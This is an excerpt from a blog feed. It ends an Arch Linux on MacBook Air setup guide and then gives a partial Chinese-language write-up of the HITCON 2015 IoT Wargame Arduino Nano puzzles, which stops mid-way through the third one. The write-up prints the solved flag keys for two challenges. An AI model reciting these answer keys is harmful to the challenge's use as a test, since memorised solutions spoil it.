awful.key({ }, &amp;quot;XF86AudioLowerVolume&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 false&amp;quot;)  
        awful.util.spawn(&amp;quot;pactl set-sink-volume 0 -5%&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86AudioRaiseVolume&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 false&amp;quot;)  
        awful.util.spawn(&amp;quot;pactl set-sink-volume 0 +5%&amp;quot;)  
    end  
)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Kernel Upgrade&lt;/h3&gt;
&lt;p&gt;After the kernel upgrade,&lt;br /&gt;
there are no &lt;code&gt;wl&lt;/code&gt; and &lt;code&gt;mba6x_bl&lt;/code&gt; modules for the new kernel,&lt;br /&gt;
(Becasue these two modules are in AUR and not supported by the Official.)&lt;br /&gt;
so, we need to rebuild &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; and &lt;code&gt;mba6x_bl-dkms&lt;/code&gt; again.&lt;br /&gt;
Otherwise, the wireless interface won't be detected and backlight cannot be tuned while using the new kernel.&lt;br /&gt;
Be sure to download the lastest version of these two packages before reboot to the new kernel.&lt;br /&gt;
Follow the instructions below should work.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S linux-headers linux  

&lt;span class="o"&gt;(&lt;/span&gt;after kernel upgarde, download lastest version of these two packages&lt;span class="o"&gt;)&lt;/span&gt;  
$ yaourt -S broadcom-wl-dkms mba6x_bl-dkms  
$ reboot  

&lt;span class="o"&gt;(&lt;/span&gt;after reboot, rebuild these two kernel modules &lt;span class="k"&gt;for&lt;/span&gt; the new kernel and load them&lt;span class="o"&gt;)&lt;/span&gt;  
$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/cache/yaourt  
$ sudo pacman -U &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;broadcom&lt;/span&gt;&lt;span class="p"&gt;-wl-dkms_package&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;mba6x_bl&lt;/span&gt;&lt;span class="p"&gt;-dkms_package&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
$ sudo modprobe wl mba6x_bl  

$ reboot  //optional  
&lt;span class="o"&gt;(&lt;/span&gt;reboot again, and make sure that everything goes right.&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Upgrade all packages  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -Syua&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Upgrade all packages (with refetching and recompling all git packages  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -Syua --devel&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Misc&lt;/h2&gt;
&lt;p&gt;Below are my personal needed. It's optional.&lt;br /&gt;
&lt;a href="https://wiki.archlinux.org/index.php/List_of_applications"&gt;https://wiki.archlinux.org/index.php/List_of_applications&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S virtualbox virtualbox-host-modules&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S unrar&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Network&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S mosh mtr wget nmap&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S dns-tools&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for &lt;code&gt;dig&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Drive&lt;/h3&gt;
&lt;p&gt;There are lots of 3rd party GNU/Linux clients for Google Drive:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/skicka"&gt;https://github.com/google/skicka&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/odeke-em/drive"&gt;https://github.com/odeke-em/drive&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vitalif/grive2"&gt;https://github.com/vitalif/grive2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/astrada/google-drive-ocamlfuse"&gt;https://github.com/astrada/google-drive-ocamlfuse&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a href="https://github.com/google/skicka"&gt;skicka&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Here, I chose &lt;code&gt;skicka&lt;/code&gt; because some of my friends had already tried it&lt;br /&gt;
and they felt good about it, espcially for the &lt;code&gt;encrypt&lt;/code&gt; funciton.  &lt;/p&gt;
&lt;p&gt;To install &lt;code&gt;skicka&lt;/code&gt; you need to install &lt;code&gt;go&lt;/code&gt; and &lt;code&gt;mercurial&lt;/code&gt; first.&lt;br /&gt;
Then, install &lt;code&gt;skicka&lt;/code&gt;, follow instructions below should work.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S go mercurial  
$ mkdir ~/go  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;GOPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/go  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;:~/go/bin  
$ go get github.com/google/skicka  
$ skicka init  
$ skicka -no-browser-auth ls    // &lt;span class="nb"&gt;set&lt;/span&gt; authentication &lt;span class="k"&gt;for&lt;/span&gt; skicka  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can check out &lt;a href="https://github.com/google/skicka/blob/master/README.md"&gt;https://github.com/google/skicka/blob/master/README.md&lt;/a&gt; for further info.  &lt;/p&gt;
&lt;p&gt;But, after I installed &lt;code&gt;skicka&lt;/code&gt;, it didn't find all my directories on Google Drive.&lt;br /&gt;
So, I just changed to &lt;code&gt;drive&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;a href="https://github.com/odeke-em/drive"&gt;drive&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;use &lt;code&gt;yaourt -S drive&lt;/code&gt; to install it.&lt;br /&gt;
then &lt;code&gt;drive init ${dir_for_google_drive}&lt;/code&gt;&lt;br /&gt;
copy and paste the token, then it should work.&lt;br /&gt;
Check &lt;a href="https://github.com/odeke-em/drive/blob/master/README.md"&gt;https://github.com/odeke-em/drive/blob/master/README.md&lt;/a&gt; for more info.&lt;br /&gt;
(This command usage is a bit like &lt;code&gt;git&lt;/code&gt;)  &lt;/p&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S python2 python-pip&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pip install virtualenvwrapper&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Pelican&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip2 install pelican markdown ghp-import&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Add SSH Key  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://help.github.com/articles/generating-ssh-keys/#platform-linux"&gt;https://help.github.com/articles/generating-ssh-keys/#platform-linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Screenshot&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S shutter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Terminal&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S rxvt-unicode guake&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Monitoring&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S htop glances lm_sensors&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo sensors-detect&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Multi-Media&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S eog&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S vlc&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S wine-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;need to uncomment &lt;code&gt;multilib&lt;/code&gt; in &lt;code&gt;/etc/pacman.conf&lt;/code&gt; first  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S playonlinux&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Office&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S evince&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for .pdf files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S libreoffice&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;App&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;TweetDeck  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S nwjs-bin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/passcod/twd"&gt;https://github.com/passcod/twd&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/passcod/twd.git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd twd&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nw .&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Still buggy and need package on AUR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Slack  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/raelgc/scudcloud"&gt;https://github.com/raelgc/scudcloud&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S scudcloud&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gitter  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S gitter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook Messenger  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S messengerfordesktop&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Popcorn-Time  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S popcorntime&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Arch Linux Only, Dual Boot, Arch Linux + OS X + Windows  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pandeiro/arch-on-air"&gt;pandeiro/arch-on-air · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Dual Boot  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mandriva-usher.blogspot.tw/2014/02/gcin-firefox-stardic.html"&gt;Mandriva: gcin 無法使用於 firefox, stardic&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/General_recommendations"&gt;General recommendations - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_guide"&gt;Beginners' guide - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/BlueDragonX/xf86-input-mtrack/blob/master/README.md"&gt;xf86-input-mtrack/README.md at master · BlueDragonX/xf86-input-mtrack · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Mid_2013_13.22_-_Version_6.2C2"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/List_of_applications"&gt;List of applications - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://help.ubuntu.com/community/MacBookAir6-2/Trusty"&gt;MacBookAir6-2/Trusty - Community Help Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Apple_Keyboard"&gt;Apple Keyboard - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Sxhkd"&gt;Sxhkd - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;Bluetooth - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth_headset"&gt;Bluetooth headset - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://xatierlike.blogspot.tw/2015/05/skicka-google-drive-command-line-tool.html"&gt;(=..=)/: skicka: Google drive command line tool&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MTP"&gt;MTP - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control"&gt;PulseAudio - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@PhilPlckthun/arch-linux-running-on-my-macbook-2ea525ebefe3"&gt;Arch Linux running on my MacBook — Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Power_management"&gt;Power management - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave"&gt;MacBookPro11,x - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Unia/powersave"&gt;GitHub - Unia/powersave: Linux power save settings, compatible with systemd&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="MacBook Air"></category><category term="Linux"></category><category term="COSCUP"></category></entry><entry><title>HITCON 2015 IOT Wargame</title><link href="https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/" rel="alternate"></link><published>2015-09-03T21:32:19+08:00</published><updated>2015-09-03T21:32:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-29:posts/2015/08/29/hitcon-2015-iot-wargame/</id><summary type="html">&lt;p&gt;今年的 HITCON 的主題是 IoT，&lt;br /&gt;
所以 Wargame 也配合了 IoT 的主題，&lt;br /&gt;
用 Arduino Nano + Raspberry Pi 出題。  &lt;/p&gt;
&lt;p&gt;Wargame 的網址是 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt;&lt;br /&gt;
&lt;img alt="IOT Wargame" src="/files/hitcon-2015-iot-wargame/iot_wargame.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Arduino Nano 部份&lt;/h2&gt;
&lt;p&gt;Arduino Nano 的題目只有三題，&lt;br /&gt;
(原本好像有打算出四題的感覺，但可能時間來不及的關係)&lt;br /&gt;
而且難度蠻簡單的，&lt;br /&gt;
其實蠻適合所有會眾入門，&lt;br /&gt;
而且每位會眾報到後都會拿到已經把題目燒進去的 Arduino Nano。&lt;br /&gt;
(還有附排針，但題目不會用到，原本一看到以為要現場焊接XD)&lt;br /&gt;
但參與度好像不高，&lt;br /&gt;
寫這篇文章的當下，&lt;br /&gt;
總計是 243 位註冊帳號，&lt;br /&gt;
其中 161 位至少答對一題，&lt;br /&gt;
三題全部都做完的有 69 位。  &lt;/p&gt;
&lt;p&gt;我自己是在第一天議程結束後的晚上才開始看題目，&lt;br /&gt;
然後大概花3個多小時才把三題都解出來，&lt;br /&gt;
(GeoHot 花了一個多小時就全解完了QQ)&lt;br /&gt;
以下寫一下自己的解法，&lt;br /&gt;
供有興趣的人參考，&lt;br /&gt;
有問題也歡迎回覆。  &lt;/p&gt;
&lt;p&gt;其實題目真的不難，&lt;br /&gt;
真的有在打 Wargame 或 CTF 的人應該覺得簡單到沒必要浪費時間寫 Write-up 吧XD&lt;br /&gt;
但因為身邊還是有人不會寫，&lt;br /&gt;
所以秉持著推廣一下 Wargame 跟 CTF 的精神寫一下這部份，&lt;br /&gt;
Orange 出的 RPi 題目我就解不出來了 XDrz  &lt;/p&gt;
&lt;h3&gt;1. 讓 Arduino Nano 能被你的電腦讀到&lt;/h3&gt;
&lt;p&gt;老實說這應該是最難的部份了，&lt;br /&gt;
因為第一次接觸 Arduino，&lt;br /&gt;
所以我在這上面花蠻多時間的Orz&lt;br /&gt;
IRC 上也很多人在詢問，&lt;br /&gt;
有看到有人在問 Mac, Windows&lt;br /&gt;
就是沒看到有人問 Linux 的，&lt;br /&gt;
(噢，好像有看到有人問 Ubuntu 的?有點忘記了)&lt;br /&gt;
因為我本身用 Arch Linux，&lt;br /&gt;
所以這篇文章會以 Arch Linux 為主，&lt;br /&gt;
(順便偷偷推廣 &lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt; XD)  &lt;/p&gt;
&lt;p&gt;Windows 的使用者可以參考會眾 toby 寫的教學&lt;br /&gt;
&lt;a href="http://toby.logdown.com/posts/293552/hitcon-play-nano-on-windows"&gt;HITCON 之 Windows 也要玩 Nano « Toby 'n Hack&lt;/a&gt;，&lt;br /&gt;
仍然不行的話，可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/Windows"&gt;Arduino - Windows&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;Mac 的使用者可以參考這篇 &lt;a href="http://arduino.stackexchange.com/questions/5119/arduino-nano-no-serial-port-for-macbook-air-2013"&gt;Arduino Nano no serial port for MacBook Air 2013 - Arduino Stack Exchange&lt;/a&gt; (但有人反應裝了還是讀不到)&lt;br /&gt;
仍然不行的話，也可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/MacOSX"&gt;Arduino - MacOSX&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;至於 Linux 的話，可以參考 Arduino 官方的這篇 &lt;a href="http://playground.arduino.cc/Learning/Linux"&gt;Arduino Playground - Linux&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;而 Arch Linux 的話，當然就是看官方的 &lt;a href="https://wiki.archlinux.org/index.php/Arduino"&gt;Arduino - ArchWiki&lt;/a&gt;，從 AUR 上安裝 Arduino。  &lt;/p&gt;
&lt;p&gt;(但其實我在還沒安裝 AUR 的 Arduino 時，&lt;br /&gt;
就已經出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 了，&lt;br /&gt;
所以我覺得應該是有 driver 的，&lt;br /&gt;
但我當時還不知道怎麼改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
所以還是裝了 AUR 的 arduino 套件，&lt;br /&gt;
直到看到 &lt;a href="http://playground.arduino.cc/Interfacing/Python"&gt;Arduino Playground - Python&lt;/a&gt;&lt;br /&gt;
才發現是 &lt;code&gt;port&lt;/code&gt; 的值錯了&lt;br /&gt;
才覺得一開始可能不用裝 &lt;code&gt;arduino&lt;/code&gt; 也會動，&lt;br /&gt;
但也懶的移除了。&lt;br /&gt;
所以如果有人也有這樣的情況，然後也還沒裝 arduino 的話，&lt;br /&gt;
可以先試試看直接改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
看能不能用，這樣就不用多裝 3xx MB 的 arduino 套件了。&lt;br /&gt;
至於怎麼改 port，下面會提到)  &lt;/p&gt;
&lt;p&gt;如果沒有出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 或是試了不成功的話，&lt;br /&gt;
就繼續試試  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S arduino  
sudo gpasswd -a $user uucp  
sudo gpasswd -a $user lock  
sudo gpasswd -a $user tty  
sudo modprobe cdc_acm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之後，登出再登入。&lt;br /&gt;
ArchWiki 上是說會出現 &lt;code&gt;/dev/ttyACMx&lt;/code&gt; (x 為數字)&lt;br /&gt;
但我的是 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt;，一樣可以正常使用。  &lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;screen /dev/ttyUSB0 115200&lt;/code&gt; 確認有顯示以下內容就是有讀到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HITCON 2015 NANO GAME  

Nano$ [0] Morse  
Nano$ [1] Maze  
Nano$ [2] Calculator  
Nano$ enter your choice:  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. 透過 pip 安裝 pyserial&lt;/h3&gt;
&lt;p&gt;在使用官方提供的 &lt;code&gt;ans.py&lt;/code&gt; 之前，&lt;br /&gt;
記得先安裝必要的套件 &lt;code&gt;pyserial&lt;/code&gt;&lt;br /&gt;
使用 &lt;code&gt;pip install pyserial&lt;/code&gt;&lt;br /&gt;
安裝完後，打開 &lt;code&gt;ans.py&lt;/code&gt;&lt;br /&gt;
將第 67 行的 &lt;code&gt;port=3&lt;/code&gt; 改成 &lt;code&gt;port='/dev/ttyUSB0'&lt;/code&gt;&lt;br /&gt;
(這邊的 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 視實際情況更改)&lt;br /&gt;
就可以開始修改 &lt;code&gt;ans.py&lt;/code&gt; 進行 Python Wargame 了(?)  &lt;/p&gt;
&lt;p&gt;修改第 47 行的 choice 可以選擇要解的題目，&lt;br /&gt;
'0' == NANO 1&lt;br /&gt;
'1' == NANO 2&lt;br /&gt;
'2' == NANO 3  &lt;/p&gt;
&lt;p&gt;每個 *.tgz 用 &lt;code&gt;tar zxvf $tgz_file&lt;/code&gt; 解開&lt;br /&gt;
每個裡面的 readme.txt 基本上都一樣的，不太需要看  &lt;/p&gt;
&lt;p&gt;每題拿到 key 之後，&lt;br /&gt;
請複製該 key，&lt;br /&gt;
再到 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt; 登入，&lt;br /&gt;
然後點選對應的題目，&lt;br /&gt;
至右下角 &lt;code&gt;enter key&lt;/code&gt; 欄位，&lt;br /&gt;
貼上 key，之後按 send 送出。  &lt;/p&gt;
&lt;p&gt;以下開始講解各題：  &lt;/p&gt;
&lt;h3&gt;NANO 1&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-1.tgz"&gt;NANO 1 原始檔&lt;/a&gt;&lt;br /&gt;
這題會拿到一串&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81"&gt;摩斯密碼&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;.... .. - -.-. --- -. -. .- -. --- --. .- -- . -- --- .-. ... .&lt;/code&gt;&lt;br /&gt;
隨便找個解摩斯密碼的網站 &lt;a href="http://morsecode.scphillips.com/translator.html"&gt;http://morsecode.scphillips.com/translator.html&lt;/a&gt;&lt;br /&gt;
解碼後得到 &lt;code&gt;HITCONNANOGAMEMORSE&lt;/code&gt;&lt;br /&gt;
把 &lt;code&gt;game0()&lt;/code&gt; 的 &lt;code&gt;answer = ''&lt;/code&gt; 改成 &lt;code&gt;answer = 'HITCONNANOGAMEMORSE'&lt;/code&gt;&lt;br /&gt;
再執行一次 &lt;code&gt;ans.py&lt;/code&gt; 便可得到 key  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 457E1A295B9D1C48&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 2&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-2.tgz"&gt;NANO 2 原始檔&lt;/a&gt;&lt;br /&gt;
這是三題裡面最難的一題，也是三題中最少人解出來的。&lt;br /&gt;
這題要在九秒內走出 &lt;code&gt;14*14&lt;/code&gt; 的迷宮，&lt;br /&gt;
從 &lt;code&gt;(0, 0)&lt;/code&gt; 走到 &lt;code&gt;(14,14)&lt;/code&gt;&lt;br /&gt;
(除非你手速夠快，不然以本題的設計基本上九秒走不完)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;O&amp;#39; 代表人、&amp;#39;.&amp;#39; 代表路、&amp;#39;+&amp;#39; 代表牆、&amp;#39;X&amp;#39; 代表出口  
&amp;#39;w&amp;#39; 往上走、&amp;#39;a&amp;#39; 往左走、&amp;#39;s&amp;#39; 往下走、&amp;#39;d&amp;#39; 往右走  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;必須修改 &lt;code&gt;game1()&lt;/code&gt; 裡頭的內容，&lt;br /&gt;
把走迷宮的演算法寫在裏面。  &lt;/p&gt;
&lt;p&gt;我用的方法其實是半自動的，在必要的時候需要手動，也不保證每次成功。&lt;br /&gt;
(要全自動的話可能需要用 &lt;a href="https://en.wikipedia.org/wiki/Breadth-first_search"&gt;BFS&lt;/a&gt;，但我太廢，覺得這樣已經能解出題目就夠了。)  &lt;/p&gt;
&lt;p&gt;程式每次會呈獻 3x3 的現在位置地圖，&lt;br /&gt;
因為 'O' 每次的位置不固定，&lt;br /&gt;
所以先找到 'O' 的現在位置後，&lt;br /&gt;
將其紀錄為 &lt;code&gt;pos_x&lt;/code&gt; 和 &lt;code&gt;pos_y&lt;/code&gt;，&lt;br /&gt;
方便之後判斷其上下左右是否可走。  &lt;/p&gt;
&lt;p&gt;再來因為我們要往右下方行走才能到達出口，&lt;br /&gt;
所以就判斷如果 'O' 的右邊(&lt;code&gt;lines[pos_y, pos_x+1]&lt;/code&gt;) 是 '.'(路) 的話就往右走，&lt;br /&gt;
已右邊舉例的話，如果有下列情況的話，就改換下一個優先的方向檢查： (按照 右、下、左、上 的順序)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邊界(&lt;code&gt;pos_x == 2&lt;/code&gt;)  (&lt;code&gt;pos_x+ 1&lt;/code&gt; 就超出邊界了)  &lt;/li&gt;
&lt;li&gt;'O' 的右邊是 '+' (牆)  &lt;/li&gt;
&lt;li&gt;上一步是往左走(往反方向走)  &lt;ul&gt;
&lt;li&gt;避免左右左右、上下上下這種不會前進的狀況發生  &lt;/li&gt;
&lt;li&gt;造成了另一個問題，每當走入三面都是牆的洞的時候，就會卡住。  &lt;/li&gt;
&lt;li&gt;這時就會需要手動移動  &lt;/li&gt;
&lt;li&gt;因為要得知上一步，所以我建立了 &lt;code&gt;steps = [None]&lt;/code&gt; 紀錄每一步的順序  &lt;/li&gt;
&lt;li&gt;把每次的移動利用 &lt;code&gt;steps.append()&lt;/code&gt; 紀錄起來  &lt;/li&gt;
&lt;li&gt;並在每次透過 &lt;code&gt;steps[-1]&lt;/code&gt; 得知上一步  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;依此類推，照著 &lt;code&gt;右、下、左、上、手動&lt;/code&gt; 的先後順序，寫出程式碼。&lt;br /&gt;
開始執行後，遇到卡住的狀況就手動控制，試個幾次很快就可以走出迷宮  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 3D52CB746F9E6C83&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 3&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-3.tgz"&gt;NANO 3 原始檔&lt;/a&gt;&lt;br /&gt;
這題是必須在一秒內回答四則運算的結果，&lt;br /&gt;
看一下題目，可以發現題目的字串長的像這樣&lt;br /&gt;
&lt;code&gt;Nano$ 7 * 10 - 14 + 6 - 5 - 19 = ?&lt;/code&gt;&lt;br /&gt;
所以可以透過 Regular Expression&lt;br /&gt;
&lt;a href="https://docs.python.org/2/library/re.html"&gt;7.2. re — Regular expression operations — Python 2.7.10 documentation&lt;/a&gt;&lt;br /&gt;
